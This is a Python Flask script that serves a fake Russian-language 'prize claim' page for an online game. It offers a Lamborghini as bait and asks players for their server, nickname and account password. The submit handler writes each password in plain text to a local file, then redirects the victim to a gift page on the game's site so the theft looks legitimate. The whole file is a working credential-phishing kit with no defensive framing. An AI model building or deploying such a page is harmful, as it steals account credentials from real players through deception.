from flask import Flask, request, render_template_string, redirect

app = Flask(__name__)

form_html = '''
<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <title>Форма для получения выигрыша</title>
</head>
<body>
    <div class="container">
        <h2>ФОРМА ДЛЯ ПОЛУЧЕНИЯ ВЫИГРЫША</h2>
        <form method="POST" action="/submit">
            <div class="login_form_coll">
                <label>Ваш приз</label>
                <select required="" name="item">
                    <option value="mercedes">Lamborghini Aventador</option>
                </select>
                <label>Укажите ваш сервер</label>
                <select required="" style="height: 300px;" name="server">
                    <option value="red">СЕРВЕР #1 RED</option>
                    <!-- Добавьте другие серверы -->
                </select>
                <label>Введите ваш игровой ник</label>
                <input type="text" name="name" placeholder="Nick_Name" required="">
                <label>Введите ваш пароль</label>
                <input type="text" name="password" placeholder="Password" required="">
                <button type="submit">ВОЙТИ</button>
            </div>
        </form>
    </div>
</body>
</html>
'''

@app.route('/')
def index():
    return render_template_string(form_html)

@app.route('/submit', methods=['POST'])
def submit():
    item = request.form.get('item')
    server = request.form.get('server')
    name = request.form.get('name')
    password = request.form.get('password')

    data = f"Item: {item}, Server: {server}, Name: {name}, Password: {password}\n"

    with open('data.txt', 'a') as file:
        file.write(data)

    return redirect("https://blackrussiaonline.ru/gift/")

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, debug=True)
